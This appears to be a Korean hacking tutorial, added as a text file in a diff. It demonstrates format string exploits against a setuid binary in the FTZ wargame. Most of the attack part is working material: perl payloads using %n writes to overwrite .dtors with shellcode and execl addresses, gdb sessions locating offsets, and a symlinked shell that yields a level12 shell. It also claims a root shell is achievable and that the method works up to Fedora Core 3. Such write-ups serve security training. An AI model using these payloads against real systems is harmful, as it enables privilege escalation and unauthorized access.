@@ -1,0 +1,309 @@
+--------------------------------------------[execl 함수를 이용한 포맷스트링 공격 ]---------------------------------
+                                                Written by awsedr45,randomkid
+
+ 
+
+     목차
+
+     0x00 OverView
+     0x01 Back Ground
+     0x02 execl format string attack
+     0x03 reference
+
+
+____________________________________________________________________________________________________________________
+     0x00 OverView
+
+     제가 문서를 쓸줄은 상상도 못했었습니다.. 하지만 좋은 기술을 공유하면 좋을거 같아서 이렇게 문서를 써봅니다.
+     더불어 엄청난 도움을 주신 randomkid 님께 정말감사합니다. 
+     문서가 문서같지 않더라도 봐주시면 고맙겠습니다.
+
+     0x01 Back Ground
+
+     현재 대부분의 리눅스가 랜덤스택,pax 패치로 non execute 스택,힙 상태입니다. 
+     요새 나온 fedora core 시리즈는 일반적인 buffer overflow 나 format string bug 공격으로는 안통합니다. 
+     방패가 발전하면 창도 발전하듯이 공격방법이 없는것은 아닙니다. 
+
+ 
+     일반적인 포맷스트링 공격법 redhat 9 (ftz 에서) 
+
+
+     step by step 1. offset 구하기 
+
+     [level11@ftz level11]$ ./attackme aaaa%x%x%x%x
+     aaaabffff32abffff0f0161616161[level11@ftz level11]$
+     [level11@ftz level11]$./attackme 
+
+
+     => step by step 2. (shellcode 주소 구하기)
+
+     [level11@ftz tmp]$ gcc -o egg egg.c
+     [level11@ftz tmp]$ cd
+     [level11@ftz level11]$ cd /tmp
+     [level11@ftz tmp]$ ./egg
+     Using address: 0xbffffac8
+
+
+     => step by step 3. (dtors 알아내기) 이외에도 got, return address 등 가능합니다 
+
+     [level11@ftz level11]$ objdump -h attackme | grep dtors
+     18 .dtors        00000008  0804960c  0804960c  0000060c  2**2
+     0804960c +4 = 0x8049610
+  
+     공격.
+
+     (fac8)=64200 -8 8바이트는 문자열주소 offset 을 맞쳐줄 %x 디렉티브 필요없이 $-flag 사용        $-flag 에 대한설명은 x82 님의 문서를 참조. 
+
+     (1bfff)114687 - (fac8)64200 = 50551
+
+     playload
+
+     ----------------------------------------------------------------------------------------------------
+    | ./attackme `perl -e 'print "\x10\x96\x04\x08","\x12\x96\x04\x08","%64192c%4\\$n","%50487c%5\\$n"'` |
+     ----------------------------------------------------------------------------------------------------
+      
+     중략...     
+
+
+     sh-2.05b$
+
+      gdb 로 정확하게 확인
+     (gdb) r `perl -e 'print "\x10\x96\x04\x08","\x12\x96\x04\x08","%64192c%4\\$n","%50487c%5\\$n"'`   
+       
+        중략..
+
+     (gdb) x/x 0x8049610
+     0x8049610 <__DTOR_END__>:       0xbffffac8   <--dtors 의 주소가 쉘코드의 주소로 바뀌었다 
+   
+     Breakpoint 1, 0x080484b7 in main ()
+     (gdb) c
+     Continuing.
+
+     Program received signal SIGTRAP, Trace/breakpoint trap.
+     0x40000be0 in _start () from /lib/ld-linux.so.2
+     (gdb) bt
+     #0  0x40000be0 in _start () from /lib/ld-linux.so.2
+     (gdb) c
+     Continuing.
+     sh-2.05b$
+
+     
+
+   
+     0x02 execl 을 이용한 포맷스트링 공격 
+
+  
+     execl 함수 시눕시스 int execl( const char *path, const char *arg, NULL);  
+                                       경로         아규먼트    0x00   
+    
+     execl 함수 사용을 이해하기 위해서는 먼저 beist 님과 vangelist 님의 fedora core overflow 를 읽고 오면 도움이 된다.
+
+  
+     execl 함수를 이용한 공격법!   
+
+     [level11@ftz level11]$ ./attackme aaaa%x%x%x%x
+     aaaabffffc37bffffa00161616161[level11@ftz level11]$
+     [level11@ftz level11]$ objdump -h attackme | grep dtors
+     18 .dtors        00000008  0804960c  0804960c  0000060c  2**2
+     [level11@ftz level11]$gdb attackme 
+     (gdb) b main
+     Breakpoint 1 at 0x8048479
+     (gdb) r
+     Starting program: /home/level11/attackme
+
+     Breakpoint 1, 0x08048479 in main ()
+     (gdb) p execl
+     $1 = {<text variable, no debug info>} 0x400d16c0 <execl>
+     (gdb) q
+     The program is running.  Exit anyway? (y or n) y
+   
+     [level11@ftz level11]$gdb attackme 
+
+
+     (gdb) disass main
+     Dump of assembler code for function main:
+     0x08048470 <main+0>:    push   %ebp
+     0x08048471 <main+1>:    mov    %esp,%ebp
+     0x08048473 <main+3>:    sub    $0x108,%esp
+     0x08048479 <main+9>:    sub    $0x8,%esp
+     0x0804847c <main+12>:   push   $0xc14
+     0x08048481 <main+17>:   push   $0xc14
+     0x08048486 <main+22>:   call   0x804834c <setreuid>
+     0x0804848b <main+27>:   add    $0x10,%esp
+     0x0804848e <main+30>:   sub    $0x8,%esp
+     0x08048491 <main+33>:   mov    0xc(%ebp),%eax
+     0x08048494 <main+36>:   add    $0x4,%eax
+     0x08048497 <main+39>:   pushl  (%eax)
+     0x08048499 <main+41>:   lea    0xfffffef8(%ebp),%eax
+     0x0804849f <main+47>:   push   %eax
+     0x080484a0 <main+48>:   call   0x804835c <strcpy>
+     0x080484a5 <main+53>:   add    $0x10,%esp
+     0x080484a8 <main+56>:   sub    $0xc,%esp
+     0x080484ab <main+59>:   lea    0xfffffef8(%ebp),%eax
+     0x080484b1 <main+65>:   push   %eax
+     0x080484b2 <main+66>:   call   0x804833c <printf>
+     0x080484b7 <main+71>:   add    $0x10,%esp
+     0x080484ba <main+74>:   leave
+     0x080484bb <main+75>:   ret
+     ---Type <return> to continue, or q <return> to quit---
+     0x080484bc <main+76>:   nop
+     0x080484bd <main+77>:   nop
+     0x080484be <main+78>:   nop
+     0x080484bf <main+79>:   nop
+     End of assembler dump.
+     (gdb)b *main+71 (printf 함수에서 format strings buf 가 나므로 바로다음 함수가 리턴하는 부분에 브레이크 포인트를 걸고 살펴본다.)
+ 
+
+     dtors = 0804960c + 4 --> 08049610
+     execl = 0x400d16c0 
+     dtors 에 execl 를 덮어 쒸워보겠다.
+     
+     16c0 = 5824 - 8 --> 5824 8바이트는 문자열 값("\x10\x96\x04\x08","\x12\x96\x04\x08")
+     400d = 16397 - 5824 --> 10573
+      
+    
+     (gdb) r `perl -e 'print "\x10\x96\x04\x08","\x12\x96\x04\x08","%5824c%4\\$n","%10573c%5\\$n"'`  $-flag 에 대한설명은 x82 님의 문서를 참조.
+     
+     중략....
+    
+
+
+
+
+     (gdb) x/x 0x8049610
+     0x8049610 <__DTOR_END__>:       0x400d16c0
+     (gdb) 
+     dtors 의 값이 execl 의 주소로 덮여쒸워졌다 
+     그면 execl 함수의 사용법을 다시보면 
+     int execl( const char *path, const char *arg, NULL);
+     첫번쨰 인자는  ebp+8
+     두번쨰 인자는  ebp+12
+     세번쨰 인자는  ebp+16  세번쨰 인자는 NULL 이어야 한다 
+
+     이제 우리는 execl 함수의 브레이크 포인트를 걸고 execl 의 인자를 ebp+8 에서 찾아봐야한다. 
+     
+     (gdb) b *execl
+     Breakpoint 2 at 0x400d16c0
+     (gdb) n
+     Single stepping until exit from function main,
+     which has no line number information.
+     0x40038917 in __libc_start_main () from /lib/libc.so.6
+     (gdb) n
+     Single stepping until exit from function __libc_start_main,
+     which has no line number information.
+
+     Breakpoint 2, 0x400d16c0 in execl () from /lib/libc.so.6
+     (gdb)  
+      좋다. execl 함수까지 nexti 명령어로 넘어갔다 그렇다면 이제 ebp+8 에서 인자를 찾아보자. 
+  
+     (gdb) x/4wx $ebp+8
+     0xbffffab0:     0x401597b8      0x401591c0      0xbffffad8      0x4004d940
+     (gdb) x/x 0x401597b8
+     0x401597b8 <initial+24>:        0x00000004
+     함수 프롤로그 부분이라서 그런지 execl (0x400d16c0) 부분은 인자참조가 제대로 안되었다 그렇다면 execl+3 부분을 쒸워보자. 
+     (gdb) x/10i $eip
+     0x400d16c0 <execl>:     push   %ebp         
+     0x400d16c1 <execl+1>:   mov    %esp,%ebp   
+     0x400d16c3 <execl+3>:   push   %edi
+     0x400d16c4 <execl+4>:   push   %esi
+     0x400d16c5 <execl+5>:   lea    0x10(%ebp),%esi
+     0x400d16c8 <execl+8>:   push   %ebx
+     0x400d16c9 <execl+9>:   call   0x4003877d <__i686.get_pc_thunk.bx>
+     0x400d16ce <execl+14>:  add    $0x87af2,%ebx
+     0x400d16d4 <execl+20>:  sub    $0x102c,%esp
+     0x400d16da <execl+26>:  movl   $0x1,0xffffffec(%ebp)
+
+     16c3 = 5827 - 8 --> 5819
+     400d = 16397 - 5827 --> 10570
+
+      
+     
+     (gdb) r `perl -e 'print "\x10\x96\x04\x08","\x12\x96\x04\x08","%5819c%4\\$n","%10570c%5\\$n"'`
+          
+     중략...
+
+
+
+     (gdb) x/x 0x8049610
+     0x8049610 <__DTOR_END__>:       0x400d16c3
+     (gdb) x/i 0x400d16c3
+     0x400d16c3 <execl+3>:   push   %edi
+     (gdb) b *execl+3
+     Breakpoint 2 at 0x400d16c3
+     (gdb) n
+     Single stepping until exit from function main,
+     which has no line number information.
+     0x40038917 in __libc_start_main () from /lib/libc.so.6
+     (gdb) n
+     Single stepping until exit from function __libc_start_main,
+     which has no line number information.
+
+     Breakpoint 2, 0x400d16c3 in execl () from /lib/libc.so.6
+     (gdb) x/x $ebp+8
+     0xbffffab0:     0x401597b8
+     (gdb) x/x 0x401597b8
+     0x401597b8 <initial+24>:        0x00000004  (인자값은 시스템 마다 달르다 여기서 중요한것은 인자같이 널로 끝나야 된다는것이다 
+                                                 예를들면 0x1a2b3b4 0x5a6b7c8d 0x9a0b(00)ac 여기서 널로 끝나는 부분이 심볼릭 링크를 걸 마지막 주소다
+                                                    ln -s shell `perl -e 'print "\xb4\xb3\x2b\1a\x8d\x7c\6b\x5a\xac"'`
+
+     좋다 그렇다면 우리가 링크걸 인자는 \x04 이다 1byte 라서 그런지 왠지 안될거 같은 느낌도 들지만 직접 실험해본봐로는 됬다.. 
+
+     (gdb) q
+     The program is running.  Exit anyway? (y or n) y
+     [level11@ftz level11]$ cd /tmp
+     [level11@ftz tmp]$ ls
+     ?  U??????]??E????????_??  aaa  level5.tmp  mysql.sock  race.c  sh  sh.c
+     [level11@ftz tmp]$ cat sh.c
+     int main()
+       {
+      printf("축하합니다~\n");
+      system("/bin/sh");
+       }
+     [level11@ftz tmp]$ ln -s sh `perl -e 'print "\x04"'`
+     [level11@ftz tmp]$ /home/level11/attackme `perl -e 'print "\x10\x96\x04\x08","\x12\x96\x04\x08","%5819c%4\\$n","%10570c%5\\$n"'`   
+
+     중략...
+
+                                                                sh-2.05b$ id
+     uid=3092(level12) gid=3091(level11) groups=3091(level11)
+     sh-2.05b$ whoami
+     level12
+     sh-2.05b$ echo congratulation~~~~~~
+     congratulation~~~~~~
+     sh-2.05b$
+
+     원래 루트쉘도 획득가능하다 
+
+     int main()
+     {
+ 
+      printf("축하합니다~\n");
+      setreuid(0);
+      system("/bin/sh");
+     }
+
+    마치는말
+    
+    위 공격은 fedora core 3 까지 가능하다 그리고 머지않아 fedora core 에 관한 글이 쏟아질것이라고 예상된다.
+
+  참고한 레퍼런스
+ 
+  (x82 님의 fedora core 공격글) 
+  (randomkid 님의 설명) 
+  http://x82.inetcop.org/h0me/papers/$-flag-formatstring.txt
+  http://www.hackerschool.org/HS_Boards/data/Lib_system/hackerleon_fs.txt
+  Advanced return-into-lib(c) exploits -nergal-
+  제3회 HackerSchool Hacking 대회 대회 보고서 -loafers- 
+  http://event.hackerschool.org/lecture/event_lecture_03/loafers.html
+  http://beist.org/research/public/fedora/index.html  
+  http://wowhacker.com/BoArD/data/lecture/fedora_한글본.pdf  
+  이외 수많은 fsb 글... 
+   
+
+Q@A 1. 왜 주소를 "\x10\x96\x04\x08","\x12\x96\x04\x08" 이렇게 2번 나누어서 공격을 했나??
+    ▶ 하나의 주소에 너무 큰값을 느면 오류가 생길수도 있고 속도가 느리기 떄문이다. 
+    
+    2. %n 디렉티브와 %hn 디렉티브의 차이점은?
+    ▶ 예를 들어서. dtors의 값이 0x12345678 이라고 하면 %n 디렉티브를 이용해서 4를 넣으면 0x00000004 로 변한다
+        그런데 %hn 으로 4를 넣을경우 0x12340004 이렇게 변한다 하지만 공격 방식의 차이는 없는것 같다 둘중 자기가 편한걸로 하면된다...
+                                                             
